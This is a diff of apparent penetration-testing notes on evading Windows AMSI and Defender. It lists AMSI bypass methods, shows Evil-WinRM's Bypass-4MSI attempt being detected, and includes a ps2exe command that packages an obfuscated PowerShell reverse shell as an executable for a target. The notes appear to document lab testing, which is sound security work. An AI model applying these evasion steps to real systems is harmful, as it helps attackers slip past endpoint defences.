@@ -1,6 +1,18 @@
-===================================================================================================================================
-Living off the land and filess techniques
-===================================================================================================================================
+================================================================================================================================================
+Living off the land and fileless techniques
+================================================================================================================================================
+
+INDEX
+===============================
+I.   Reminder & Definitions
+II.  Examples of manual AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+III. Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+IV.  Examples of AMSI and AV bypass using the tool 'Invoke-Obfuscation' (obfuscation technique)
+
+
+================================================================================================================================================
+I. Reminder & Definitions
+================================================================================================================================================
 
 ---------------------------------------------------------------
 Why using 'living off the land and fileless' techniques ?
@@ -15,10 +27,10 @@ Why using 'living off the land and fileless' techniques ?
   - dual-use tools,
   - non-PE file attacks.
 
-  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools and therefore minimizes
-  the risk of an attack being detected and blocked.
+  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools (i.e. AV) and therefore 
+  minimizes the risk of an attack being detected and blocked.
 
-  Before executing a "hacking" and/or security audit scripts (e.g. '.ps1', '.vbs', '.bat') on a Windows machine it is recommended to disable the 
+  Before executing a "hacking" and/or security audit scripts (e.g. '.ps1', '.vbs', '.bat') on a modern Windows machine it is recommended to disable the 
   Antimalware Scan Interface (AMSI) to avoid our scripts being scanned and potentially blocked by the AV installed on the Windows machine.
 
 ---------------------------------------------------------------
@@ -38,13 +50,16 @@ Microsoft Antimalware Scan Interface (AMSI)
   that's present on a Windows machine (e.g. Windows Defender AntiVirus is enabled by default on Windows 10/11).
   AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided
   by today's antimalware products that can be integrated into applications. 
+  
+> The AMSI protects PowerShell by loading AMSI’s DLL (amsi.dll) into the PowerShell’s memory space.
+  It scans the PowerShell console input by using Windows Defender (or other AV) to determine whether to block the payload operation or allow it to continue.
 
 > There are many techniques to bypass AMSI such as:
   - patching the amsi.dll in memory
   - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed' are encoded to avoid the AV to detect and block the AMSI bypass)
   - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
-  - placing a separate amsi.dll in the current working directory
-  - registry Key Modification
+  - placing a separate amsi.dll in the current working directory (note: legacy technique)
+  - registry key modification
   The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 
 
   Usefull links:
@@ -91,8 +106,9 @@ Windows Security features and Microsoft security products
   - It is a post-breach solution that complements Microsoft Defender AV.
   - It is an EDR that detects and remediates advanced attacks on endpoints. 
   
+  
 ================================================================================================================================================
-1. Examples of manual AMSI and AV bypass techniques 
+II.  Examples of manual AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
 ================================================================================================================================================
 
 Test 1 - Manual AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
@@ -211,9 +227,9 @@ This script contains malicious content and has been blocked by your antivirus so
 => It is working.
 
 
-===================================================================================================================================================
-2. Examples of AMSI and AV bypass using the tool EVIL-WINRM (in Kali)
-===================================================================================================================================================
+================================================================================================================================================
+III. Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (patching technique)
+================================================================================================================================================
 
 Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
 ---------------------------------------------------------------------------------------------------------------------------------------------------
@@ -402,12 +418,11 @@ This script contains malicious content and has been blocked by your antivirus so
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
 [+] Success!
 
-Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='192.168.1.35' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>
-
+Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: 
+<f:WSManFault Code='1726' Machine='192.168.1.35' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host
+process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>
 Error: Exiting with code 1
-
 Error: Exiting with code 1
-
 
 => Note: The "Bypass-4MSI" feature is not working. It is detected by Windows Defender and the WinRM connection is shutdown.
 
@@ -435,9 +450,9 @@ Affected items:
 	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
 
 
-===================================================================================================================================================
-3. Example of AMSI and AV bypass using the tool Invoke-Obfuscation
-===================================================================================================================================================
+================================================================================================================================================
+IV. Example of AMSI and AV bypass using the tool 'Invoke-Obfuscation' (obfuscation technique)
+================================================================================================================================================
 
 => URL: https://github.com/danielbohannon/Invoke-Obfuscation
 
@@ -586,12 +601,12 @@ Note:
 -----
 > We could also create an .exe file containing our obfuscated powershell reverse shell using the script 'ps2exe.ps1' and then upload and execute it on our target.
 
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> ./ps2exe.ps1 -inputFile 'Test-reverse.ps1' -outputFile 'Test-reverse.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS
+PS C:\Users\Administrator\Documents\Tools-AD> ./ps2exe.ps1 -inputFile 'Test-reverse.ps1' -outputFile 'Test-reverse.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS
 PS2EXE-GUI v0.5.0.26 by Ingo Karstein, reworked and GUI support by Markus Scholtes
 You are using PowerShell 4.0 or above.
-Reading input file C:\Users\Administrator.PO718687\Documents\Tools-AD\Test-reverse.ps1
+Reading input file C:\Users\Administrator.\Documents\Tools-AD\Test-reverse.ps1
 Compiling file...
-Output file C:\Users\Administrator.PO718687\Documents\Tools-AD\Test-reverse.exe written
+Output file C:\Users\Administrator\Documents\Tools-AD\Test-reverse.exe written
 
 
 => On our attacker machine
@@ -663,7 +678,7 @@ VERBOSE: Failed to redirect data from Stream 1 to Stream 2
 
 
 ===================================================================================================================================================
-4. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+V. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
 ===================================================================================================================================================
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
